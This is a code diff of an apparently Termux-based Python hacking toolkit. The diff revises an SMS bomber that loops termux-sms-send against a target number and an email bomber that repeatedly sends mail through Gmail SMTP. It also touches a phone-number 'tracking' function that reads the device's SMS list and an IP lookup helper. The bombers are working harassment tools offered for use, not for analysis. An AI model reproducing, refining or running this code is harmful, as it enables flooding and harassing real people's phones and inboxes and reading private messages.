@@ -1,9 +1,8 @@
 import os
-import time
 import subprocess
-import smtplib
+import time
 import requests
-from email.mime.text import MIMEText
+import re
 from colorama import Fore
 
 # Colors for UI
@@ -31,27 +30,27 @@ def banner():
     print(f"{G}Made by AllahAkbar313{W}")
     print("\n")
 
-# SMS Forwarder
-def forward_sms(phone_number, message):
-    print(f"{G}[+] New Message from {phone_number}: {W}{message}")
-
-# Get Phone Number
+# Validate phone number
 def get_phone_number():
     while True:
         number = input(f"{C}Enter the phone number to track (or type 'exit' to quit): {W}")
         if number.lower() == "exit":
             print(f"{R}Exiting...{W}")
             exit()
-        elif number.isdigit() and len(number) >= 8:  # Basic validation
+        elif re.match(r'^\+?\d{8,15}$', number):  # Allows optional "+" and 8-15 digits
             return number
         else:
-            print(f"{R}Invalid number! Please enter a valid phone number.{W}")
+            print(f"{R}Invalid number! Please enter a valid phone number (e.g., +96877384814 or 96877384814).{W}")
 
 # Get SMS using Termux API
 def get_sms():
     result = subprocess.run(["termux-sms-list"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     sms_list = result.stdout.decode("utf-8").strip().split("\n")
     return sms_list
+
+# Forward SMS
+def forward_sms(phone_number, message):
+    print(f"{G}[+] New Message from {phone_number}: {W}{message}")
 
 # Start Tracking
 def start_tracking(phone_number, update_interval):
@@ -71,20 +70,20 @@ def start_tracking(phone_number, update_interval):
     except KeyboardInterrupt:
         print(f"{R}\nTracking stopped. Exiting...{W}")
 
-# SMS Bomber Function
+# Function to perform SMS Bombing
 def sms_bomber(phone_number, delay, bomb_count):
     print(f"{Y}Starting SMS Bombing on {phone_number}...{W}")
     for i in range(bomb_count):
-        result = subprocess.run(["termux-sms-send", phone_number, f"Bombing message {i+1}!"], capture_output=True, text=True)
-        if result.returncode != 0:
-            print(f"{R}Error: {result.stderr}{W}")
-        else:
-            print(f"{G}[{i+1}] SMS Sent!{W}")
+        subprocess.run(["termux-sms-send", "-n", phone_number, f"Bombing message {i+1}!"])
+        print(f"{G}[{i+1}] SMS Sent!{W}")
         time.sleep(delay)  # Delay between sending each SMS
     print(f"{G}Bombing completed!{W}")
 
 # Email Bomber Function
 def email_bomber(target_email, subject, body, count):
+    import smtplib
+    from email.mime.text import MIMEText
+
     print(f"{Y}Starting Email Bombing on {target_email}...{W}")
     for i in range(count):
         msg = MIMEText(body)
@@ -92,17 +91,14 @@ def email_bomber(target_email, subject, body, count):
         msg['From'] = "your-email@gmail.com"
         msg['To'] = target_email
 
-        try:
-            with smtplib.SMTP("smtp.gmail.com", 587) as server:
-                server.starttls()
-                server.login("your-email@gmail.com", "your-email-password")
-                server.sendmail("your-email@gmail.com", target_email, msg.as_string())
-                print(f"{G}[{i+1}] Email Sent!{W}")
-        except Exception as e:
-            print(f"{R}Error: {str(e)}{W}")
+        with smtplib.SMTP("smtp.gmail.com", 587) as server:
+            server.starttls()
+            server.login("your-email@gmail.com", "your-email-password")
+            server.sendmail("your-email@gmail.com", target_email, msg.as_string())
+            print(f"{G}[{i+1}] Email Sent!{W}")
         time.sleep(1)
 
-# IP Tracker Function (Dummy for now, real IP tracker requires external API)
+# IP Tracker Function
 def ip_tracker(ip_address):
     print(f"{Y}Tracking IP: {ip_address}...{W}")
     response = requests.get(f"https://ipinfo.io/{ip_address}/json")
